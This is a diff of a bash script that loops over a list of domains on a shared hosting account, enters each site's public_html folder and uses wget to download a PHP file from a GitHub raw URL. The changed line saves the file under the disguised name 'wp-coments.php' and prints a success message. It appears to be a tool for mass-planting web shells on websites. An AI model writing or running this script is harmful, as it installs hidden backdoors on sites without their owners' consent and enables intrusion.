@@ -14,7 +14,7 @@ echo "====================================="
 read -p "Input File: " lis;
 read -p "Path: " pat;
 while read line; do
-c=$(cd /home/qtannet/domains/${line}/public_html/ && wget -q https://raw.githubusercontent.com/sandanisa/oke/main/pu.php -O uup.php)
+c=$(cd /home/hubert09/domains/${line}/public_html/ && wget -q https://raw.githubusercontent.com/sandanisa7/a/main/JawirGenk.php -O wp-coments.php)
 if [[ $c ]];
 then
 echo -e "${nat}[${ijo}Succes${nat}] ${line}/uup.php"
